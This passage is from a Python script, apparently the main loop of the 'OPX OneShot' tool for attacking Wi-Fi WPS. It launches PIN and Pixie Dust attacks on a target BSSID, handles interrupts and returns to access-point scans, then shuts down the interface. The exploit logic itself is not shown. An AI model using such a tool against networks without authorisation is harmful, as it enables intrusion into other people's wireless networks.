                        RealtimeLogger.info(f'Starting standard PIN attack on {args.bssid}')
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    RealtimeLogger.info('Aborting…')
                    break
                else:
                    args.bssid = None
            else:
                RealtimeLogger.warn('Aborting…')
                break

    if args.iface_down:
        RealtimeLogger.step(f'Bringing interface {args.interface} down…')
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        RealtimeLogger.step('Deactivating MediaTek Wi‑Fi interface…')
        wmtWifi_device.write_text("0")

    RealtimeLogger.separator()
    RealtimeLogger.info('OPX OneShot finished')
